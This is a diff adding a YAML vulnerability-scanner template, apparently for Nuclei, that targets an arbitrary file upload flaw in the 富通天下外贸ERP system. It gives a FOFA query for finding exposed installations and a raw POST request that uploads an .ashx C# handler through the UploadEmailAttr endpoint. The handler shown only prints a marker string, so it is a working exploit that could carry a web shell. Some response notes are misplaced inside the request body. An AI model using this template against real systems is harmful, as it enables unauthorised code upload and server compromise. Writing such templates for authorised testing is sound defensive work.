@@ -1,0 +1,75 @@
+id: poc-sogc5qgokmia5wig
+info:
+  name: 富通天下外贸ERP UploadEmailAttr 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sogc5qgokmia5wig'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sogc5qgokmia5wig
+    fofa: title="用户登录_富通天下外贸ERP"
+http:
+- raw:
+  - 'POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    <% @ webhandler language="C#" class="AverageHandler" %>
+
+
+    using System;
+
+
+    using System.Web;
+
+
+    public class AverageHandler : IHttpHandler
+
+
+    {
+
+
+    public bool IsReusable
+
+
+    { get { return true; } }
+
+
+    public void ProcessRequest(HttpContext ctx)
+
+
+    {
+
+
+    ctx.Response.Write("dudesuite");
+
+
+    }
+
+
+    }
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    emailatta
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
